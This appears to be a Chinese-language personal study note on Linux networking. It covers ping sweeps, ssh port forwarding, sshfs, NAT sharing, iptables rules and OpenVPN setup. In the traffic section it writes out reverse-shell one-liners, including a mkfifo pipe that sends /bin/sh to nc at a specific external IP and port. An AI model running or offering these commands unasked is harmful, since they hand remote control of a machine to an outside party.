# Day10

## 0x01 网络

1. ping

   列出网络中存活主机

   ```bash
   #!/bin/bash
   #  name: a.sh
   # to scan ip
   
   for ip in 192.168.0.{1,255};
   do
   	(ping $ip -c 2 & > /dev/null;
   
   	if [ $? -eq 0 ];
   	then
   		echo $ip is alive;
   		fi
   	)&
   done
   wait
   ```

2. ssh

   `-C`压缩数据

3. FTP

   ftp中可以使用的指令:

   1. `cd dir` : 更改远程主机的目录
   2. `lcd dir`: 更改本地的目录
   3. `put a b` : 将本机的a加载到远程的b
   4. `mkdir` 在远程主机上创建目录
   5. `ls` 列举远程的
   6. `get` 下载远程文件到本地
   7. `quit` 退出

4. sftp

   基于SSH开发的一款类ftp的软件000

5. **端口转发**

   将本地的8000端口转发到`www.kernel.org:80`

   ```bash
   ssh -L 8000:www.kernel.org:80 dem0@localhost
   ```

   但是这里需要注意的是 本地必须打开ssh服务不然就会

   ```
   ssh: connect to host localhost port 22: Connection refused
   ```

   你只要更改最后locahost未你想要的端口 就会把顺序更改过来。

   :a:如果你只是想要端口转发而不是要一个shell

   ```
   ssh -fL 8000:www.kernel.org:80 dem0@localhost -N
   ```

   其中`-f` 表示ssh在执行命令后转入后台执行，-N表示不需要执行命令，只进行端口转发

   :b:反向端口转发

   如果你有一台无法通过互联网访问到的主机，但是你又想要别人访问到，那么就可以设置反向端口转发。

   ```bash
   ssh -R 8000:localhost:80 username@machine
   ```

   这条命令需要在本地运行，但是后面的账号秘密应该是vps的账号。这样在vps上面访问8000端口就会访问到本地80服务了。

6. 本地挂载远程驱动器

   `sshfs -o allow_other user@remote:/home/path /mnt/mountpoint`

   unmount 可以卸载

7. 网络流量探测

   `lsof -i`  可以查看已经打开的文件（-i 限制在已经打开的网络连接上

   查看当前主机已经打开的端口

   ```
   sudo lsof -i | grep ":[0-9a-z]*" -o | grep "[0-9a-z]*" -o | sort | uniq
   ```

   可以使用

   ```bash
   netstat -tnp
   ```

   反弹shell

   ```
   nc ip port | /bin/bash | nc ip port
   ```

   原理

   ```
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 8.142.93.103 1337 >/tmp/f
   ```

   创建了一个管道把nc收到的数据全部打到sh的交互。

8. 网络带宽测试

   `iperf -c ip` 客户端发送

   `iperf -mc ip` 然后找最大传输单元

9. 搭建网桥

   假设现在有两个网卡 eth0 连接到子网： 192.168.1.0 eth1没有配置

   ```
   ip link add br0 type bridge #创建名未br0的新网桥
   ip link set dev eth1 master br0 # 即将eth1网卡加入到网桥
   ifconfig br0 10.10.0.2 #给网桥配置ip地址
   echo 1 > /proc/sys/net/ipv4/ip_forward # 启用分组转发
   ```

   添加路由 让`10.10.0.0/24`中的主机可以发现192.168.1.0/16路由表项

   ```
   route add -net 192.168.1.0/16 gw 10.10.0.2#网关配置成网桥的ip
   ```

   另外一个相反

   ```
   route add -net 10.10.0.0/24 gw 192.168.1.2
   ```
   
10. internet连接共享

    ```bash
    #!/bin/bash
    #name: netsharing
    #to share internet like NAT
    
    echo 1 > /proc/sys/net/ipv4/ip_forward
    
    iptables -A FORWARD -i $1 -o $2 \
    	-s 10.99.0.0/16 -m conntrack --ctstate NEW -j ACCEPT
    
    iptables -A FORWARD -m conntrack --ctstate \
    	ESTABLISHED,RELATED -j ACCEPT
    iptables -A POSTROUTING -t nat -j MASQUERADE
    ```

    简单分析一下这个脚本 全是全新的知识。

    `10.99.0.0/16`这个是自己新建立的wifi的ip。

    默认情况下，LINUX系统只接收或者生成分组，不会重传。`echo 1 > /proc/sys/net/ipv4/ip_forward`所以必须得依靠这一句命令来实现这个功能。`会让LINUX转发所有无法识别的分组` 。:red_circle: ？注意: 我们的wifi的ip一般都属于是保留ip所以连入internet的linux无法识别，他就会以自己做为网关，发送。

11. iptables 架设防火墙

    ban ip和ban发送的流量

    ```
    iptables -A OUTPUT -d 82.8.8.8 -j DROP #丢弃发送到ip的数据包
    ```

    ```
    iptables -A INPUT   -s 1.2.3.4 -j DROP #丢弃来自ip数据包
    ```

    `-d -s : dest source`

    阻止发送到特定端口的流量

    ```
    iptables -A OUTPUT -p tcp -dport 21 -j DROP
    ```

12. 搭建VPN服务

    使用OPENVPN

    第一步是安装OPENVPN，没什么好说的。

    第二步是生成证书

    ```
    easy-rsa
    ./build-ca 生成认证授权
    ./build-key server 生成服务器证书
    ./build-key client 生成客户端证书
    ./build-dh 生成DIFFIE-Hellman
    ```

    拷贝证书

    ```
    cp keys/server* /etc/openvpn
    cp keys/ca.crt /etc/openvpn
    cp keys/dh* /etc/openvpn
    ```

    客户端

    ```
    只需要拷贝ca证书和client证书
    ```

    服务器配置OPENVPN

    ```
    local ip 侦听的本地ip地址#连接到网络的地址
    ```

    修改证书路劲 还有DH的正确路劲

    服务端

    修改证书路径，设置服务器的·ip和端口就可以了
